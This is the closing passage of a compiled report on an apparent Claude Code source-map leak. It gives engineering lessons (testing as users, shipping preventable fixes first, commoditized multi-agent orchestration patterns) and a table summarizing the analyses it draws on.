3. **Testing privileged paths is essential.** The `db8` bug only manifested for non-Anthropic users. Anthropic employees never saw it because `ss1()==="ant"` gave them a different code path. Test as your users, not as yourself.

4. **The orchestration patterns are now commoditized.** `open-multi-agent` proves that the coordinator-team-task-DAG pattern can be re-implemented in ~8K lines. The competitive advantage is no longer knowing these patterns exist — it's in the quality of your implementation and the robustness of your failure handling.

5. **Ship preventable things first.** Anthropic had AI-powered leak prevention (Undercover Mode), adversarial verification agents, 22 bash security validators — and shipped a 60MB source map because of a missing `.npmignore` entry. The lesson: automate the mundane before building the sophisticated.

### 6. One-Line Summaries per Source

| Source | One-Line Summary |
|---|---|
| **Sabrina Ramonov** | The technically definitive analysis — code paths, line numbers, the compaction attack vector, the parser differential, and the verification agent's self-doubt |
| **Varshith V Hegde** | The complete narrative — timeline, conspiracy theory, concurrent npm RAT, DMCA futility, and the three-layer memory architecture |
| **open-multi-agent** | The leak's most concrete legacy — Claude Code's orchestration patterns extracted into 8K lines of model-agnostic, deployable-anywhere TypeScript |
| **Reddit (open-multi-agent)** | The positioning pitch — "the design patterns are the value, not the code" |
| **Reddit + cc-cache-fix** | The most immediately useful finding — a two-line fix for a caching regression that was burning users' token budgets on every session resume |

---

*Document compiled: April 5, 2026*  
*Sources: sabrina.dev, dev.to, github.com/JackChen-me/open-multi-agent, github.com/Rangizingo/cc-cache-fix, Reddit*
